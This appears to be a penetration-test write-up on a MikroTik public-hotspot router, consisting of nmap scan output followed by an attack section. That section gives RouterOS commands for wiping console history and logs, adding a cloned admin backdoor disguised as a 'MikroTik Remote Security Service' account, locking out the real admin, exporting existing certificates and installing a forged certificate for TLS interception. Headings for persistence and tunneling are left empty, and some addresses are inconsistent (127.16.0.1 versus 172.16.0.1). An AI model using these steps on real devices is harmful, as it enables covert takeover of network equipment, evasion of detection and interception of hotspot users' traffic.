# MikroTik Meltdown: The Sad Reality of IOT and Public Wifi

## 1. Legal Notice & Disclaimer

**Confidentiality Notice:** This document contains confidential and proprietary information intended solely for the use of the authorized recipient. Any review, retransmission, dissemination, or other use of, or taking of any action in reliance upon this information by persons or entities other than the intended recipient is prohibited.

**Disclaimer of Liability:** The information within this report is provided for security assessment and educational purposes. All activities were conducted with the explicit, written authorization of the asset owner. The author(s) and contributor(s) of this document assume no liability and are not responsible for any misuse or damage caused by the application or misapplication of the information provided. The responsibility for any action taken based on the findings of this report lies solely with the reader.

**Scope of Authorization:** All activities documented herein were performed with full authorization from the privately-owned business and do not reflect upon the franchise entity itself. This operation was carried out under a Non-Disclosure Agreement (NDA) and was authorized for public disclosure under proper redaction.

**Severity & Impact Warning:** The vulnerabilities detailed in this report are critical and actively exploitable in the wild. While the target hardware may appear dated (circa 2005-present), it remains in active use across multiple locations. This report is strictly for educational and defensive purposes to highlight the risks of legacy IoT devices.

## 2. Introduction

## 3. Scope
Any and all LAN/VLAN services diconnected from the centralized business/hosting platform.

* **3.3 Initial**
    - The web-hosted platform `http://172.16.0.1:8000`
    - SSH Services `127.16.0.1 22`
    - Telnet Services `127.16.0.1 23`
    - FTP Services `127.16.0.1 21`
    - WinBox `127.16.0.1 8291` // _Note: Found during enum and added to scope_
    - WebConf `127.16.0.1 55511` // _Note: Found during enum and added to scope_
 
* **3.4 Attack Vectors**
    - `http://172.16.0.1:8000` Possible SQLI, XSSRF, XSS & Bufferoverflow RCE.
    - `http://172.16.0.1:55511` WebConf CLI

## 4. Methodology

* **4.1 OpSec Security**
    - Use `macchanger` not only to mask your operations but for further persistence operations down the line.
    - `openvpn` is essential for further persistence techniques.

* **4.2 NMAP Initial Scan**
Command: `nmap -vv -sV -sC -T5 -oN init.nmap 172.16.0.1`

```markdown
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-29 15:29 MST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.00s elapsed
Initiating Ping Scan at 15:29
Scanning 172.16.0.1 [2 ports]
Completed Ping Scan at 15:29, 0.01s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:29
Completed Parallel DNS resolution of 1 host. at 15:29, 0.00s elapsed
Initiating Connect Scan at 15:29
Scanning hotspot.target.net (172.16.0.1) [1000 ports]
Discovered open port 443/tcp on 172.16.0.1
Discovered open port 80/tcp on 172.16.0.1
Discovered open port 53/tcp on 172.16.0.1
Discovered open port 2000/tcp on 172.16.0.1
Completed Connect Scan at 15:29, 0.08s elapsed (1000 total ports)
Initiating Service scan at 15:29
Scanning 4 services on hotspot.target.net (172.16.0.1)
Completed Service scan at 15:29, 16.07s elapsed (4 services on 1 host)
NSE: Script scanning 172.16.0.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 8.29s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.01s elapsed
Nmap scan report for hotspot.target.net (172.16.0.1)
Host is up, received syn-ack (0.0046s latency).
Scanned at 2025-12-29 15:29:34 MST for 25s
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE        REASON  VERSION
53/tcp   open  domain         syn-ack (generic dns response: NOTIMP)
80/tcp   open  http           syn-ack MikroTik HotSpot
| http-methods: 
|_  Supported Methods: GET POST
| http-title: mikrotik hotspot > status
|_Requested resource was http://hotspot.target.net/status
|_http-favicon: Unknown favicon MD5: B1EC55A877C3CF6D19ABAD30DE886CAB
443/tcp  open  https?         syn-ack
2000/tcp open  bandwidth-test syn-ack MikroTik bandwidth-test server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.94SVN%I=7%D=12/29%Time=695300D9%P=x86_64-pc-linux-gnu%r(
SF:DNSVersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
Service Info: OS: RouterOS; CPE: cpe:/o:mikrotik:routeros

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:29
Completed NSE at 15:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.82 seconds
```

* **4.3 Service Identification**
    - `53 DNS (hotspot.target.net) 172.16.0.1`
    - `80(8000) HTTP (hotspot.target.net) 172.16.0.1 // Default Creds: guest`
    - `443 TLS (hotspot.target.net) 172.16.0.1` // _Note: Standard TLS-encrypted web traffic._
    - `2000 Bandwidth-Test (172.16.0.1:55511) 172.16.0.1` // _Note: Later identified as a CLI tool for bandwidth testing._

* **4.4 NMAP Full Port/Service Scan**
Command: `nmap -vv -sV -T5 -p- -oN full.nmap 172.16.0.1`

```markdown
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-29 15:34 MST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 15:34
Scanning 172.16.0.1 [2 ports]
Completed Ping Scan at 15:34, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:34
Completed Parallel DNS resolution of 1 host. at 15:34, 0.00s elapsed
Initiating Connect Scan at 15:34
Scanning hotspot.target.net (172.16.0.1) [65535 ports]
Discovered open port 80/tcp on 172.16.0.1
Discovered open port 53/tcp on 172.16.0.1
Discovered open port 443/tcp on 172.16.0.1
Discovered open port 55519/tcp on 172.16.0.1
Discovered open port 64872/tcp on 172.16.0.1
Discovered open port 64875/tcp on 172.16.0.1
Warning: 172.16.0.1 giving up on port because retransmission cap hit (2).
Discovered open port 64874/tcp on 172.16.0.1
Discovered open port 2146/tcp on 172.16.0.1
Discovered open port 55511/tcp on 172.16.0.1
Discovered open port 2000/tcp on 172.16.0.1
Discovered open port 64873/tcp on 172.16.0.1
Completed Connect Scan at 15:34, 4.59s elapsed (65535 total ports)
Initiating Service scan at 15:34
Scanning 11 services on hotspot.target.net (172.16.0.1)
Completed Service scan at 15:37, 157.02s elapsed (11 services on 1 host)
NSE: Script scanning 172.16.0.1.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 8.11s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 8.02s elapsed
Nmap scan report for hotspot.target.net (172.16.0.1)
Host is up, received syn-ack (0.0087s latency).
Scanned at 2025-12-29 15:34:19 MST for 178s
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        REASON      VERSION
53/tcp    open     domain         syn-ack     (generic dns response: NOTIMP)
80/tcp    open     http           syn-ack     MikroTik HotSpot
443/tcp   open     https?         syn-ack
2000/tcp  open     bandwidth-test syn-ack     MikroTik bandwidth-test server
2146/tcp  open     lv-not?        syn-ack
55511/tcp open     http           syn-ack     MikroTik router config httpd
55513/tcp filtered unknown        no-response
55519/tcp open     http           syn-ack     MikroTik router config httpd
64872/tcp open     domain         syn-ack     (generic dns response: NOTIMP)
64873/tcp open     http           syn-ack     MikroTik HotSpot
64874/tcp open     http-proxy     syn-ack     MikroTik http proxy
64875/tcp open     unknown        syn-ack
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.94SVN%I=7%D=12/29%Time=695301FB%P=x86_64-pc-linux-gnu%r(
SF:DNSVersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port64872-TCP:V=7.94SVN%I=7%D=12/29%Time=69530214%P=x86_64-pc-linux-gnu
SF:%r(DNSVersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
Service Info: OS: RouterOS; Device: router; CPE: cpe:/o:mikrotik:routeros

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.00 seconds
```

* **4.5 Service Identification**
    - `55511 (http://172.16.0.1:55511 webconf) Unauthenticated Admin Access`
    - `55513 Filtered Port, Not Investigated`
    - `64873 MikroTik RouterOS Status Page`
    - `55519 (http://172.16.0.1:55519 Admin Panel) Authenticated (Note: Session hijackable via port 55511)`
    - And other high-numbered ports related to MikroTik services.



## 5. Attack Vectors & Techniques

### 5.1 Unauthenticated Admin Access
Target: `http://172.16.0.1:55511`

* **1. OpSec Essentials**
    - Clear Console History: `console clear-history`
    - Establish Minimal Logging: `system logging action set memory memory-lines=1`
    - Log Validation: `log print`

* **2. Admin Cloning**
    * **2.1 Create User from Admin**
        - `user add copy-from=admin name="www" password="..."`
        
    * **2.2 Create New User With Admin Functionality**
        - `user add name="www" group=full password="..."`

    * **2.3 Hijacking the Admin**
        - `user edit admin password="..."` _NOTE: This seems ineffective on `http://172.16.0.1:55519`_
        - `user edit admin password=""`
        - `user enable www`
        - `user diable admin`

    * **2.4 SE Implementation**
        The objective here is to establish as user that would look similar to an `authorized` remote access/user. In our case being `MikroTik`, the configurations will be as follows.
        - `user add copy-from=admin name="www" password="..."`
        - `user set www comment="MikroTik Remote Security Service"`

* **3. PPP:Point-To-Point Profile Creation (Essential)**
    This profile is going to be used around, in my concept I prefered the `SE` method for account creation due to the relation.
    * **3.1 Execution**
        - `ppp profile add name=wwwProfile local-address=... remote-address=pool1 rate-limit=1M/1M`
    * **3.2 SE**
        - `ppp profile set comment="MikroTik Remote Web-Service Profile"`

* **4. TLS Hijacking**
    * **4.1 Check Existing Certs**
        - `certificate print`
    * **4.2 Export Any Existing**
        - `certificate export-certificate [find name~"."] export-passphrase=""` _NOTE: This file will be able to be located using `file print`. I have noticed that the `export` command fails on direct download, further down we will implement the `tool fetch` command to `fetch` the file down to our device._
    * **4.3 Build Your Certificates**
        - `certificate add name="www" common-name="MikroTik" country="US" state=".." locality="..." organization="MikroTik" days-valid=3650 key-size=2048`
    * **4.4 Sign It**
        - `certificate sign www`
    * **4.5 Assign To The Web-Services**
        - `ip service set www certificate=www disabled=no`
    * **4.6 Sanitize**
        - `file remove cert_export_*`

* **5. M-I-T-M Hijacking**

* **5. Hotspot VLAN Hijacking**

* **6. Open VPN VPS Persistence**

* **7. CLI WebConf Remote Persistence**

* **8. Establish Proxy Tunneling**
